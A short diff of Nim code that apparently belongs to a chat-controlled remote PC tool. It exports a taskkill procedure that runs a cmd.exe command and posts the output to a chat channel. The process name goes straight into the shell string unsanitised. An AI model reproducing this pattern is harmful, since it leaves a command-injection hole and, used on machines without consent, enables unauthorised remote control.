@@ -97,9 +97,9 @@ proc cd*(self: PcControl, path: string): Future[Message] {.async.} =
         discard await messageSender.sendOutput(self.api, self.channelId, "Error")
 
 # --- TASKKILL --- #
-proc taskkill(self: PcControl, processName: string): Future[Message] {.async.} =
+proc taskkill*(self: PcControl, processName: string): Future[Message] {.async.} =
     try:
-        output = execCmdEx(&"cmd.exe /c taskkill /f /im {processName}").output
+        let output = execCmdEx(&"cmd.exe /c taskkill /f /im {processName}").output
         discard await messageSender.sendOutput(self.api, self.channelId, output)
     except:
         discard await messageSender.sendOutput(self.api, self.channelId, "Error")
